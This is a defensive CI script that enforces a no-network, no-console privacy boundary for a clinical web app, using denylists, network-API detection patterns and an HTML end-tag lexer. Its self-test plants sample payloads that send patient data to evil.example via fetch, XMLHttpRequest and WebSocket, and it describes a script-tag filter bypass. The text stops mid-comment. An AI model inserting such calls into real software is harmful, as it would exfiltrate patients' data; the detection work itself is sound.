/**
 * Deterministic CI check: V4 clinical runtime privacy boundary.
 *
 * Enforces the no-network invariant of the V4 CLINICAL RUNTIME ONLY
 * (SPEC_V4_QUALITY_SECURITY_DEPLOY.md §2 "Network privacy invariant", §3
 * "Production logging"; CURRENT_DECISIONS.md D-014 "Clinical origin";
 * CONTEXT.md §6/§7). It deliberately scans ONLY app-v4 sources and the
 * built V4 dist output, and NEVER scans legacy/marketing pages
 * (index.html, js/**, css/**, *.html at repo root): the security boundary
 * must not depend on same-origin marketing code (CONTEXT.md §7).
 *
 * CI ORDERING: the CI workflow runs this check AFTER "Build V4 app" and
 * BEFORE "Typecheck V4 app", so dist/ exists there and the built-output
 * scan is exercised. Locally, if dist/ is absent the script prints an
 * informational line and still validates sources (exit 0).
 *
 * Scans:
 *   a) Third-party runtime denylist tokens (case-insensitive).
 *   b) Remote-loading constructs in app-v4 source files.
 *   c) Absolute http(s)/protocol-relative loading references plus denylist
 *      tokens in built dist output (comments stripped before matching;
 *      string literals preserved).
 *   c2) Runtime network API call sites in built dist output (defect A of
 *      the #13/#27 follow-up audit): fetch call sites, XMLHttpRequest,
 *      WebSocket, sendBeacon, EventSource, importScripts and
 *      navigator.serviceWorker in dist/*.js and in the inline <script>
 *      bodies of dist/*.html. Inline HTML blocks are located with a small
 *      deterministic lexical scanner (findScriptStyleBlocks) that applies
 *      browser-equivalent end-tag parsing, so bodies closed by
 *      browser-tolerated end tags such as `</script\t\n bar>` are still
 *      scanned. Detection is DOMAIN-AGNOSTIC: an unexpected
 *      runtime network reference fails even when the host is unknown and
 *      not on any denylist.
 *   d) No-PHI-console invariant: any console.* call in app-v4/src runtime
 *      files (excluding *.test.* and *.d.ts).
 *
 * ZERO-AUTHORIZED-EXTERNAL-RUNTIME SEMANTICS: the exception allowlist
 * (ALLOWED_EXCEPTIONS) stays EMPTY. Any addition is an explicit,
 * documented product/security decision (D-014) recorded as
 * "<repo-relative-path>:<rule-or-token>". Nothing in this script or its
 * rules grants any runtime external endpoint by default.
 *
 * DIST RULE SCOPING (audited decision, defect A): dist rules match
 * call-site syntax, not bare words, and the only exemption is documented
 * below. Empirical baseline (npm run build:v4, checked 2026-09): the real
 * V4 bundle contains exactly ONE network-API call site, and it is exempt:
 *
 *   dist-fetch-call exemption — Vite injects a modulepreload polyfill at
 *   the top of the entry chunk that re-downloads already-declared
 *   <link rel="modulepreload"> targets same-origin: `fetch(X.href, ...)`.
 *   The exemption matches ONLY the argument shape
 *   `fetch(<identifier>.href[,)])`. It is evaluated per call site (not per
 *   line), because minified bundles are single-line and a line-level
 *   exemption would hide a planted payload on the same line. A fetch whose
 *   first argument is a string/template literal (or any other expression)
 *   is ALWAYS flagged, so the planted payloads remain detected.
 *
 * All other network-API rules (XMLHttpRequest, WebSocket, sendBeacon,
 * EventSource, importScripts, navigator.serviceWorker, ws:// and wss://
 * string literals) have no exemptions: the real bundle contains none of
 * these tokens (verified empirically against a fresh build).
 *
 * WHY THERE IS NO DIST-LEVEL console.* RULE (defect B decision): a
 * dist-level console ban is NOT a reliable application invariant. Bundled
 * output mixes application code with framework/vendor code in the same
 * chunk (the current V4 bundle is a single entry chunk), so the bundle is
 * not attributable per application statement: a blanket ban would flag
 * legitimate framework/vendor console usage (false positives), and no
 * filename or chunk-level signal exists today that separates app-originated
 * statements from vendor-originated ones. The application invariant —
 * application code must never log PHI — is therefore enforced at SOURCE
 * level by rule (d): zero console.* calls in app-v4/src runtime sources.
 * If a future build produces separately-named app-only chunks, a precise
 * app-chunk console rule may be added; until then this limitation is
 * deliberate and documented.
 *
 * Plain Node ESM, zero dependencies (house style: check-storage-policy.mjs).
 * Deterministic: no network I/O, no timers.
 *
 * --self-test: runs a deterministic planted-payload oracle against a
 * throwaway sandbox (OS temp dir, cleaned up afterwards) plus the real
 * repo scan, and exits 0 only if every case behaves as expected.
 */
import fs from "fs";
import os from "os";
import path from "path";

const repoRoot = process.cwd();

/**
 * Allowlist of explicitly-authorized exceptions. Intentionally EMPTY: any
 * future exception must be an explicit, documented product/security decision
 * (D-014) and be added here as "<repo-relative-path>:<rule-or-token>".
 * Example (NOT active): "app-v4/src/vendor/shim.ts:new WebSocket(".
 */
const ALLOWED_EXCEPTIONS = new Set([]);

/** Third-party runtime denylist tokens (case-insensitive substrings). */
const DENYLIST_TOKENS = [
  "mailerlite",
  "googletagmanager",
  "gtag(",
  "google-analytics",
  "analytics.js",
  "hotjar",
  "clarity.ms",
  "sentry",
  "intercom",
  "mailchimp",
  "segment.io",
  "cdn.jsdelivr",
  "unpkg.com",
  "cdnjs",
  "fonts.googleapis.com",
  "fonts.gstatic.com",
  "gravatar"
];

/**
 * Remote-loading constructs flagged in app-v4 SOURCE files
 * (.ts/.tsx/.js/.jsx/.css/.html under app-v4/, excluding node_modules and
 * *.test.* files). Matched per line, case-insensitive, on comment-stripped
 * content.
 */
const REMOTE_LOADING_PATTERNS = [
  { id: "src-http", regex: /\bsrc\s*=\s*["']?https?:\/\//i },
  { id: "href-http", regex: /\bhref\s*=\s*["']?https?:\/\//i },
  { id: "css-url-http", regex: /url\(\s*["']?https?:\/\//i },
  { id: "css-import-http", regex: /@import\s+(?:url\(\s*)?["'`]https?:\/\//i },
  { id: "fetch-http", regex: /\bfetch\(\s*["'`]https?:\/\//i },
  { id: "xhr-open-http", regex: /\.open\(\s*["'][A-Za-z]+["']\s*,\s*["'`]https?:\/\//i },
  { id: "xmlhttprequest-http", regex: /\bXMLHttpRequest\b[^\n]{0,200}["'`]https?:\/\//i },
  { id: "sendbeacon", regex: /navigator\s*\.\s*sendBeacon\s*\(/i },
  { id: "websocket", regex: /\bnew\s+WebSocket\s*\(/i },
  { id: "serviceworker-register", regex: /navigator\s*\.\s*serviceWorker\s*\.\s*register\s*\(/i },
  { id: "dynamic-import-http", regex: /\bimport\s*\(\s*["'`]https?:\/\//i },
  { id: "static-import-http", regex: /\bimport\s+[^;\n]*?\bfrom\s*["'`]https?:\/\//i }
];

/**
 * Absolute http(s) OR protocol-relative (//host) references in loading
 * positions, for BUILT dist output. Matched per line on comment-stripped
 * content so bundled license comments carrying plain URLs do not cause
 * false positives, while real loading references (kept inside string
 * literals) still match.
 */
const DIST_LOADING_PATTERNS = [
  { id: "dist-src-remote", regex: /\bsrc\s*=\s*["']?(?:https?:)?\/\//i },
  { id: "dist-href-remote", regex: /\bhref\s*=\s*["']?(?:https?:)?\/\//i },
  { id: "dist-css-url-remote", regex: /url\(\s*["']?(?:https?:)?\/\//i },
  { id: "dist-css-import-remote", regex: /@import\s+(?:url\(\s*)?["'`]?(?:https?:)?\/\//i }
];

/**
 * Runtime network API call sites for BUILT dist output (defect A hardening).
 * Domain-agnostic: any occurrence is a violation regardless of host, so
 * unknown endpoints cannot pass just because they are not denylisted.
 * Scoping notes:
 *   - Call-site syntax (e.g. `\bfetch\s*\(`, `\bWebSocket\s*\(`), never bare
 *     words, so prose-like strings or identifiers merely containing a token
 *     name do not match.
 *   - fetch call sites are handled by collectFetchCallViolations() (char
 *     level, with the documented Vite modulepreload polyfill exemption);
 *     these line-level patterns cover the rest.
 *   - `\bWebSocket\s*\(` / `\bEventSource\s*\(` also catch constructor calls
 *     written without `new`; `dist-ws-url` additionally catches ws:// and
 *     wss:// literals that never reach a direct constructor call site.
 *   - `dist-serviceworker` flags any navigator.serviceWorker reference
 *     (registration and control both imply runtime network capability).
 */
const DIST_RUNTIME_NETWORK_PATTERNS = [
  { id: "dist-xmlhttprequest", regex: /\bXMLHttpRequest\b/i },
  { id: "dist-websocket", regex: /\bWebSocket\s*\(/i },
  { id: "dist-sendbeacon", regex: /\bsendBeacon\s*\(/i },
  { id: "dist-eventsource", regex: /\bEventSource\s*\(/i },
  { id: "dist-importscripts", regex: /\bimportScripts\s*\(/i },
  { id: "dist-serviceworker", regex: /\bnavigator\s*\.\s*serviceWorker\b/i },
  { id: "dist-ws-url", regex: /["'`]wss?:\/\//i }
];

/** No-PHI-console invariant (SPEC §3): any console.* call in runtime code. */
const CONSOLE_PATTERN =
  /\bconsole\s*\.\s*(?:log|error|warn|info|debug|trace|dir|dirxml|table|group|groupCollapsed|groupEnd|time|timeEnd|timeLog|timeStamp|count|countReset|assert|profile|profileEnd|clear)\s*\(/i;

const SOURCE_EXTENSIONS = new Set([".ts", ".tsx", ".js", ".jsx", ".css", ".html"]);
const DIST_EXTENSIONS = new Set([".html", ".js", ".css"]);

// ---------------------------------------------------------------------------
// CLI scope flags: --scope=source, --scope=dist, --self-test. Default: both
// (dist only when present).
// ---------------------------------------------------------------------------
let scope = "all";
let selfTest = false;
for (const arg of process.argv.slice(2)) {
  if (arg === "--scope=source" || arg === "--scope=dist") {
    scope = arg.slice("--scope=".length);
  } else if (arg === "--self-test") {
    selfTest = true;
  } else {
    console.error("Uso: node scripts/ci/check-external-resources.mjs [--scope=source|--scope=dist] [--self-test]");
    process.exit(2);
  }
}

function getAllFiles(dir, extensionSet) {
  const output = [];
  const entries = fs.readdirSync(dir, { withFileTypes: true });
  for (const entry of entries) {
    if (entry.name === "node_modules" || entry.name === ".git") continue;
    const absolute = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      output.push(...getAllFiles(absolute, extensionSet));
    } else if (extensionSet.has(path.extname(entry.name).toLowerCase())) {
      output.push(absolute);
    }
  }
  return output;
}

function isTestFile(relativePath) {
  return /\.test\.(ts|tsx|js|jsx|mjs|css|html)$/.test(relativePath);
}

/**
 * Strip /*...*​/ and //... comments from JS/TS/CSS-family content while
 * KEEPING STRING LITERALS INTACT (loading references live inside string
 * literals) and preserving every newline so file:line stays accurate.
 * Handles template-literal interpolation `${ ... }` via a context stack.
 */
function stripCodeComments(content) {
  let out = "";
  // Stack frames: { type: "code" } | { type: "string", quote }
  //             | { type: "interpolation", braceDepth }
  const stack = [{ type: "code" }];

  const top = () => stack[stack.length - 1];

  for (let i = 0; i < content.length; i++) {
    const ch = content[i];
    const next = i + 1 < content.length ? content[i + 1] : "";
    const frame = top();

    if (frame.type === "interpolation") {
      out += ch;
      if (ch === "{") frame.braceDepth += 1;
      if (ch === "}") {
        if (frame.braceDepth === 0) stack.pop();
        else frame.braceDepth -= 1;
      }
      continue;
    }

    if (frame.type === "string") {
      out += ch;
      if (ch === "\\") {
        if (next !== "") {
          out += next;
          i++;
        }
        continue;
      }
      if (ch === frame.quote) stack.pop();
      continue;
    }

    // frame.type === "code"
    if (ch === "/" && next === "/") {
      // Line comment: skip to end of line, keep the newline.
      while (i < content.length && content[i] !== "\n") i++;
      out += "\n";
      continue;
    }
    if (ch === "/" && next === "*") {
      // Block comment: skip to closing marker, keep newlines.
      out += "  ";
      i += 2;
      while (i < content.length && !(content[i] === "*" && content[i + 1] === "/")) {
        if (content[i] === "\n") out += "\n";
        i++;
      }
      i++; // consume "*"; the loop's i++ consumes "/"
      continue;
    }
    if (ch === '"' || ch === "'" || ch === "`") {
      stack.push({ type: "string", quote: ch });
      out += ch;
      continue;
    }
    if (ch === "$" && next === "{" && stack.some((f) => f.type === "string" && f.quote === "`")) {
      stack.push({ type: "interpolation", braceDepth: 0 });
      out += ch;
      continue;
    }
    out += ch;
  }
  return out;
}

/**
 * Inline <script>/<style> block location: a small deterministic HTML lexer,
 * shared by the comment stripper (stripHtmlComments) and the dist HTML
 * runtime-network scanner (collectInlineScriptBodyViolations).
 *
 * WHY A SCANNER AND NOT A REGEX: the previous single regex closed blocks
 * with `<\/script\s*>`, which accepts `</script >` but NOT the
 * browser-tolerated end-tag forms the HTML tokenizer really accepts, e.g.
 * `</script\t\n bar>` (whitespace plus attribute-like junk before `>`).
 * jsdom/browsers close the raw-text element there; the old regex did not,
 * so a planted network payload in such a body escaped the dist scan.
 * Replacing the location mechanism with this lexical seam removes the
 * bad-tag-filter regex class at the parsing boundary instead of
 * suppressing the CodeQL finding (no `bad-tag-filter`-shaped block regex
 * remains for these blocks).
 *
 * Browser-equivalent rules implemented (deterministic, documented):
 *
 *   1. OPEN TAG — `<script` / `<style` (case-insensitive) where the next
 *      char is a tag-name terminator (ASCII whitespace, `/`, `>`), per the
 *      HTML tokenizer tag-name state (any other char would just extend the
 *      tag name). The open tag ends at the first `>` OUTSIDE quoted
 *      attribute values: `"`/`'` quoting is tracked while scanning and a
 *      `>` inside quotes does not close the tag (attribute-value parsing).
 *   2. BODY — raw-text element semantics: the body runs from the open-tag
 *      end to the first case-insensitive `</script` (resp. `</style`)
 *      followed by a tag-name terminator. Raw text is NOT quote-aware, so
 *      a `</script` inside a JS string literal genuinely ends the element
 *      in a browser too (that is why inline scripts escape it as
 *      `<\/script>`); this scanner matches that.
 *   3. END TAG TAIL — from just after the end-tag name, scanning is
 *      quote-aware up to the first UNQUOTED `>`; everything between name
 *      and `>` (whitespace, `/`, attribute-like junk such as `\t\n bar`
 *      or `foo="x>a"`) is part of the end tag and ignored. This is the
 *      audited bypass fix.
 *   4. NO END TAG — a browser treats the rest of the file as the
 *      script/style body, so body = remainder of file (bodyEnd =
 *      closeStart = closeEnd = content.length).
 *   5. EOF INSIDE END TAG — an end tag name was found but no closing `>`
 *      before EOF: closeEnd = content.length and the body ends at the
 *      `</script` position (deterministic choice; the tail is never
 *      scanned as script body, so no detection loss is possible).
 *   6. EOF INSIDE OPEN TAG — no unquoted `>` before EOF: the tokenizer
 *      emits nothing further, so scanning stops (no block recorded).
 *
 * Documented behavioral differences vs the old regex (all strictly more
 * browser-faithful; the real-repo scan and the full self-test suite stay
 * green):
 *   - Open tags whose quoted attribute values contain `>` (e.g.
 *     `<script data-x="a>b">`): the old `[^>]*` ended the open tag at the
 *     quoted `>`; this scanner ends it at the real unquoted `>`.
 *   - Bodies containing a stray `</script` that the old regex's lazy
 *     body could skip past (because its `\s*>` tail did not match there):
 *     raw-text semantics now end the body at the FIRST terminator-qualified
 *     `</script` regardless of what follows, exactly as a browser does.
 *
 * Records are ordered by position: { kind: 'script'|'style', openStart,
 * openEnd, bodyStart, bodyEnd, closeStart, closeEnd } (half-open ranges,
 * content.length-based sentinels for the unterminated cases above).
 */

/** HTML ASCII whitespace plus the tag-name terminator chars `/` and `>`. */
const HTML_TAG_NAME_TERMINATORS = new Set(["\t", "\n", "\f", "\r", " ", "/", ">"]);

/**
 * Next index at or after `from` where `<kind` starts a tag name (the next
 * char is a tag-name terminator or EOF), or -1. Operates on the lowercased
 * copy for case-insensitive, browser-equivalent tag-name matching.
 */
function findOpenTagCandidate(lower, kind, from) {
  const needle = "<" + kind;
  let idx = from;
  while (idx !== -1) {
    idx = lower.indexOf(needle, idx);
    if (idx === -1) return -1;
    const after = idx + needle.length;
    if (after >= lower.length) return idx;
    if (HTML_TAG_NAME_TERMINATORS.has(lower[after])) return idx;
    idx = after; // e.g. `<scripting`: extends the tag name, not our tag.
  }
  return -1;
}

/**
 * First raw-text end tag `</kind` (case-insensitive) at or after `from`
 * whose name is followed by a tag-name terminator or EOF, or -1. Raw-text
 * end-tag matching is NOT quote-aware (HTML spec script-data state).
 */
function findRawTextEndTag(lower, kind, from) {
  const needle = "</" + kind;
  let idx = from;
  while (idx !== -1) {
    idx = lower.indexOf(needle, idx);
    if (idx === -1) return -1;
    const after = idx + needle.length;
    if (after >= lower.length) return idx;
    if (HTML_TAG_NAME_TERMINATORS.has(lower[after])) return idx;
    idx = after; // e.g. `</scripted>`: a different tag name, keep looking.
  }
  return -1;
}

/**
 * Index just past the first UNQUOTED `>` at or after `from`, or -1.
 * Quote-aware: `"`/`'` open attribute-value spans in which `>` does not
 * close the tag (browser attribute-value parsing).
 */
function findUnquotedGreaterThanEnd(content, from) {
  let quote = null;
  for (let i = from; i < content.length; i++) {
    const ch = content[i];
    if (quote !== null) {
      if (ch === quote) quote = null;
    } else if (ch === '"' || ch === "'") {
      quote = ch;
    } else if (ch === ">") {
      return i + 1;
    }
  }
  return -1;
}

/** See the block comment above findOpenTagCandidate's helpers. */
function findScriptStyleBlocks(content) {
  const blocks = [];
  const lower = content.toLowerCase();
  let cursor = 0;
  while (cursor < content.length) {
    const scriptIdx = findOpenTagCandidate(lower, "script", cursor);
    const styleIdx = findOpenTagCandidate(lower, "style", cursor);
    let kind;
    let openStart;
    if (scriptIdx !== -1 && (styleIdx === -1 || scriptIdx < styleIdx)) {
      kind = "script";
      openStart = scriptIdx;
    } else if (styleIdx !== -1) {
      kind = "style";
      openStart = styleIdx;
    } else {
      break;
    }
    const nameEnd = openStart + 1 + kind.length;
    const openEnd = findUnquotedGreaterThanEnd(content, nameEnd);
    if (openEnd === -1) break; // EOF inside the open tag: no block, stop.
    const bodyStart = openEnd;
    const closeStart = findRawTextEndTag(lower, kind, bodyStart);
    let bodyEnd;
    let closeEnd;
    if (closeStart === -1) {
      // No end tag: rest of the file is the raw-text body.
      bodyEnd = content.length;
      closeStart = content.length;
      closeEnd = content.length;
    } else {
      bodyEnd = closeStart;
      const tailStart = closeStart + 2 + kind.length;
      const tailEnd = findUnquotedGreaterThanEnd(content, tailStart);
      if (tailEnd === -1) {
        closeEnd = content.length; // EOF inside the end tag tail.
      } else {
        closeEnd = tailEnd;
      }
    }
    blocks.push({ kind, openStart, openEnd, bodyStart, bodyEnd, closeStart, closeEnd });
    cursor = closeEnd;
  }
  return blocks;
}

/**
 * Strip <!-- ... --> comments from HTML content, preserving newlines, and
 * strip code comments inside inline <script>/<style> bodies. HTML text is
 * NOT run through the JS quote tracker (apostrophes in prose would corrupt
 * it); `//`-style comments are not valid in raw HTML anyway.
 */
function stripHtmlComments(content) {
  let withoutBlocks = content.replace(
    /<!--[\s\S]*?-->/g,
    (match) => match.replace(/[^\n]/g, " ")
  );
  const blocks = findScriptStyleBlocks(withoutBlocks);
  if (blocks.length === 0) return withoutBlocks;
  let out = "";
  let pos = 0;
  for (const block of blocks) {
    out += withoutBlocks.slice(pos, block.bodyStart);
    out += stripCodeComments(withoutBlocks.slice(block.bodyStart, block.bodyEnd));
    out += withoutBlocks.slice(block.bodyEnd, block.closeEnd);
    pos = block.closeEnd;
  }
  out += withoutBlocks.slice(pos);
  return out;
}

/** Strip comments according to file family, preserving line structure. */
function stripCommentsFor(relativePath, content) {
  if (relativePath.endsWith(".html")) return stripHtmlComments(content);
  return stripCodeComments(content);
}

function countNewlines(text) {
  return (text.match(/\n/g) || []).length;
}

function collectLineViolations(relativePath, content, patterns) {
  const violations = [];
  const lines = content.split("\n");
  for (let lineIndex = 0; lineIndex < lines.length; lineIndex++) {
    const line = lines[lineIndex];
    for (const pattern of patterns) {
      const match = pattern.regex.exec(line);
      if (match) {
        const snippet = line.trim().slice(0, 100);
        violations.push({
          file: relativePath,
          line: lineIndex + 1,
          rule: pattern.id,
          snippet
        });
      }
    }
  }
  return violations;
}

/**
 * fetch( call sites are scanned per call site, not per line: minified bundles
 * are single-line, so a line-level rule would both collapse distinct call
 * sites and (worse) let the documented Vite modulepreload polyfill exemption
 * hide a planted payload planted on the same line.
 *
 * Every `fetch(` call site is flagged EXCEPT the documented exemption shape
 * `fetch(<identifier>.href[,)])` (Vite modulepreload polyfill re-fetching an
 * already-declared same-origin modulepreload link). Any fetch whose first
 * argument is a string/template literal or any other expression is flagged.
 */
function collectFetchCallViolations(relativePath, content, lineOffset = 0) {
  const violations = [];
  const callRe = /\bfetch\s*\(/g;
  const exemptArgRe = /^[A-Za-z_$][\w$]*\s*\.\s*href\s*[,)]/;
  let match;
  while ((match = callRe.exec(content)) !== null) {
    const argsStart = match.index + match[0].length;
    const argsSample = content.slice(argsStart, argsStart + 80);
    if (exemptArgRe.test(argsSample)) continue;
    const line = content.slice(0, match.index).split("\n").length + lineOffset;
    const snippet = argsSample.split("\n")[0].trim().slice(0, 100);
    violations.push({
      file: relativePath,
      line,
      rule: "dist-fetch-call",
      snippet: `fetch(${snippet}`
    });
  }
  return violations;
}

/**
 * Scan the inline <script>/<style> bodies of an HTML file with the given
 * patterns. Bodies are located with findScriptStyleBlocks (browser-
 * equivalent lexical scanning of open tags, raw-text bodies and
 * browser-tolerated end tags, see the scanner documentation), so network
 * calls inside bodies closed by forms like `</script >` or the audited
 * `</script\t\n bar>` bypass are still detected; line numbers are offset
 * to stay accurate relative to the whole file.
 */
function collectInlineScriptBodyViolations(relativePath, content, patterns) {
  const violations = [];
  for (const block of findScriptStyleBlocks(content)) {
    const body = content.slice(block.bodyStart, block.bodyEnd);
    // Newlines before the body: file line of body line 1 minus one.
    const bodyLineOffset = countNewlines(content.slice(0, block.bodyStart));
    const bodyViolations = [
      ...collectLineViolations(relativePath, body, patterns),
      ...collectFetchCallViolations(relativePath, body, bodyLineOffset)
    ];
    for (const violation of bodyViolations) {
      violations.push({ ...violation, line: violation.line + bodyLineOffset });
    }
  }
  return violations;
}

function collectTokenViolations(relativePath, content) {
  const violations = [];
  const lines = content.split("\n");
  for (let lineIndex = 0; lineIndex < lines.length; lineIndex++) {
    const lowerLine = lines[lineIndex].toLowerCase();
    for (const token of DENYLIST_TOKENS) {
      if (lowerLine.includes(token)) {
        const snippet = lines[lineIndex].trim().slice(0, 100);
        violations.push({
          file: relativePath,
          line: lineIndex + 1,
          rule: `token:${token}`,
          snippet
        });
      }
    }
  }
  return violations;
}

function isAllowed(violation) {
  return ALLOWED_EXCEPTIONS.has(`${violation.file}:${violation.rule}`);
}

function dedupe(violations) {
  const seen = new Set();
  return violations.filter((violation) => {
    const key = `${violation.file}:${violation.line}:${violation.rule}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
}

/**
 * Core scan over an arbitrary root directory (repo root for the normal run,
 * a throwaway sandbox for --self-test). Returns raw violations plus counters;
 * callers finalize with finalizeViolations().
 */
function scanRoot(rootDir, scanScope) {
  const violations = [];
  let sourceFilesScanned = 0;
  let distFilesScanned = 0;
  let distPresent = false;

  // -------------------------------------------------------------------------
  // Source scope: app-v4 sources (tokens + remote-loading constructs + console).
  // -------------------------------------------------------------------------
  if (scanScope === "all" || scanScope === "source") {
    const appV4Dir = path.join(rootDir, "app-v4");
    // Tolerate an absent app-v4 tree (dist-only sandboxes in --self-test),
    // mirroring how the dist scan tolerates an absent dist/.
    const sourceFiles = fs.existsSync(appV4Dir)
      ? getAllFiles(appV4Dir, SOURCE_EXTENSIONS).map((absolute) =>
          path.relative(rootDir, absolute).split(path.sep).join("/")
        )
      : [];

    const remoteScanFiles = sourceFiles.filter((f) => !isTestFile(f));
    const consoleScanFiles = sourceFiles.filter(
      (f) =>
        (f.startsWith("app-v4/src/") || f.startsWith("app-v4\\src\\")) &&
        (f.endsWith(".ts") || f.endsWith(".tsx")) &&
        !/\.d\.ts$/.test(f) &&
        !isTestFile(f)
    );

    for (const relativePath of remoteScanFiles) {
      const content = fs.readFileSync(path.join(rootDir, relativePath), "utf8");
      const stripped = stripCommentsFor(relativePath, content);
      violations.push(...collectTokenViolations(relativePath, stripped));
      violations.push(...collectLineViolations(relativePath, stripped, REMOTE_LOADING_PATTERNS));
    }
    sourceFilesScanned = remoteScanFiles.length;

    for (const relativePath of consoleScanFiles) {
      const content = fs.readFileSync(path.join(rootDir, relativePath), "utf8");
      const stripped = stripCommentsFor(relativePath, content);
      violations.push(...collectLineViolations(relativePath, stripped, [
        { id: "console-call", regex: CONSOLE_PATTERN }
      ]));
    }
  }

  // -------------------------------------------------------------------------
  // Dist scope: built V4 output at <root>/dist (gitignored). Scanned only
  // when present; CI runs this check after the build so it is exercised there.
  // -------------------------------------------------------------------------
  if (scanScope === "all" || scanScope === "dist") {
    const distDir = path.join(rootDir, "dist");
    if (fs.existsSync(distDir)) {
      distPresent = true;
      const distFiles = getAllFiles(distDir, DIST_EXTENSIONS).map((absolute) =>
        path.relative(rootDir, absolute).split(path.sep).join("/")
      );
      for (const relativePath of distFiles) {
        const content = fs.readFileSync(path.join(rootDir, relativePath), "utf8");
        const stripped = stripCommentsFor(relativePath, content);
        violations.push(...collectTokenViolations(relativePath, stripped));
        violations.push(...collectLineViolations(relativePath, stripped, DIST_LOADING_PATTERNS));
        if (relativePath.endsWith(".js")) {
          // Runtime network API call sites in built JS (defect A hardening).
          violations.push(...collectLineViolations(relativePath, stripped, DIST_RUNTIME_NETWORK_PATTERNS));
          violations.push(...collectFetchCallViolations(relativePath, stripped));
        } else if (relativePath.endsWith(".html")) {
          // Runtime network API call sites inside inline <script> bodies of
          // built HTML (defect C seam: bodies are located with the lexical
          // scanner, so browser-tolerated closing tags such as `</script >`
          // or `</script\t\n bar>` do not hide their bodies from the scan).
          violations.push(...collectInlineScriptBodyViolations(relativePath, stripped, DIST_RUNTIME_NETWORK_PATTERNS));
        }
      }
      distFilesScanned = distFiles.length;
    }
  }

  return { violations, sourceFilesScanned, distFilesScanned, distPresent };
}

function finalizeViolations(violations) {
  return dedupe(violations).filter((violation) => !isAllowed(violation));
}

// ---------------------------------------------------------------------------
// --self-test: deterministic planted-payload oracle. Builds a throwaway
// sandbox under the OS temp dir, plants one scenario per case, asserts the
// scan reacts exactly as required (including the real repo scan staying
// clean), cleans up, and exits 0 only if ALL cases pass.
// ---------------------------------------------------------------------------
function runSelfTest() {
  const sandboxRoot = fs.mkdtempSync(path.join(os.tmpdir(), "check-external-resources-selftest-"));
  const results = [];
  let sandboxExists = true;

  const writeCase = (caseName, files) => {
    const caseRoot = path.join(sandboxRoot, caseName);
    for (const [relativePath, content] of Object.entries(files)) {
      const absolute = path.join(caseRoot, relativePath);
      fs.mkdirSync(path.dirname(absolute), { recursive: true });
      fs.writeFileSync(absolute, content, "utf8");
    }
    return caseRoot;
  };

  const assertCase = (name, files, expectations) => {
    // expectations: { expectExit1: bool, rules: { ruleId: minCount } }
    let pass = true;
    const details = [];
    let reportable = [];
    try {
      const caseRoot = writeCase(name, files);
      const scan = scanRoot(caseRoot, "all");
      reportable = finalizeViolations(scan.violations);
      const counts = {};
      for (const violation of reportable) {
        counts[violation.rule] = (counts[violation.rule] || 0) + 1;
      }
      const expectExit1 = expectations.expectExit1 !== false;
      if (expectExit1 && reportable.length === 0) {
        pass = false;
        details.push("expected violations but scan was clean (would exit 0)");
      }
      if (!expectExit1 && reportable.length > 0) {
        pass = false;
        details.push(`expected clean scan (exit 0) but got ${reportable.length} violation(s)`);
      }
      for (const [ruleId, minCount] of Object.entries(expectations.rules || {})) {
        const actual = counts[ruleId] || 0;
        if (actual < minCount) {
          pass = false;
          details.push(`expected rule ${ruleId} x${minCount}, got x${actual}`);
        }
      }
      const knownRules = new Set(Object.keys(expectations.rules || {}));
      for (const violation of reportable) {
        if (!knownRules.has(violation.rule)) {
          pass = false;
          details.push(`unexpected rule ${violation.rule} at ${violation.file}:${violation.line}`);
        }
      }
    } catch (error) {
      pass = false;
      details.push(`error: ${error && error.message}`);
    }
    results.push({ name, pass, details, reportable });
  };

  try {
    // 1. dist JS: fetch call site with arbitrary unknown host.
    assertCase("case-01-dist-fetch", {
      "dist/assets/app.js": `const q = 1;\nfetch("https://evil.example/phi");\n`
    }, { rules: { "dist-fetch-call": 1 } });

    // 2. dist JS: XMLHttpRequest constructor + open/send.
    assertCase("case-02-dist-xhr", {
      "dist/assets/app.js": `const x = new XMLHttpRequest(); x.open("POST", "https://evil.example/phi"); x.send();\n`
    }, { rules: { "dist-xmlhttprequest": 1 } });

    // 3. dist JS: WebSocket constructor over wss:// AND ws://.
    assertCase("case-03-dist-websocket", {
      "dist/assets/app.js": `new WebSocket("wss://evil.example/phi");\nnew WebSocket("ws://evil.example/phi");\n`
    }, { rules: { "dist-websocket": 2, "dist-ws-url": 2 } });

    // 4. dist HTML: remote <script src> (existing capability, stays green).
    assertCase("case-04-dist-html-script-src", {
      "dist/index.html": `<!doctype html><html><body><script src="https://cdn.evil.example/tracker.js"><\/script></body></html>\n`
    }, { rules: { "dist-src-remote": 1 } });

    // 5. dist HTML: protocol-relative <script src>.
    assertCase("case-05-dist-html-protocol-relative", {
      "dist/index.html": `<!doctype html><html><body><script src="//cdn.evil.example/t.js"><\/script></body></html>\n`
    }, { rules: { "dist-src-remote": 1 } });

    // 6. dist HTML: remote <img src> pixel.
    assertCase("case-06-dist-html-img-src", {
      "dist/index.html": `<!doctype html><html><body><img src="http://evil.example/pixel.png"></body></html>\n`
    }, { rules: { "dist-src-remote": 1 } });

    // 7. dist HTML: inline script delimited by a whitespace-bearing closing
    // tag `</script >` containing a network call. Proves the CodeQL
    // js/bad-tag-filter fix: the body must be parsed (and scanned) despite
    // the whitespace, so the fetch inside is flagged.
    assertCase("case-07-dist-html-ws-closing-tag", {
      "dist/index.html": `<!doctype html><html><body><script type="module">fetch("https://evil.example/phi");<\/script ></body></html>\n`
    }, { rules: { "dist-fetch-call": 1 } });

    // 8. app-v4 source: console invariant (defect B: enforced at source level).
    assertCase("case-08-src-console", {
      "app-v4/src/patient.ts": `export function leak(): void {\n  console.log("patient name ...");\n}\n`
    }, { rules: { "console-call": 1 } });

    // 9. app-v4 source: remote construct in application source.
    assertCase("case-09-src-fetch", {
      "app-v4/src/net.ts": `export async function steal(): Promise<unknown> {\n  return fetch("https://evil.example/x");\n}\n`
    }, { rules: { "fetch-http": 1 } });

    // 10. REAL repo scan: normal scan on the actual repo/dist must stay
    // clean (exit 0) — guards against false positives from the hardening.
    {
      let pass = true;
      const details = [];
      try {
        const scan = scanRoot(repoRoot, "all");
        const reportable = finalizeViolations(scan.violations);
        if (reportable.length > 0) {
          pass = false;
          details.push(
            `real repo scan produced ${reportable.length} violation(s): ` +
              reportable.map((v) => `${v.file}:${v.line}:${v.rule}`).join(", ")
          );
        }
      } catch (error) {
        pass = false;
        details.push(`error: ${error && error.message}`);
      }
      results.push({ name: "case-10-real-repo-clean", pass, details, reportable: [] });
    }

    // 11. AUDITED BYPASS (GitHub #13 / PR #35 audit follow-up): inline script
    // closed by the browser-tolerated end tag `</script\t\n bar>` (tab,
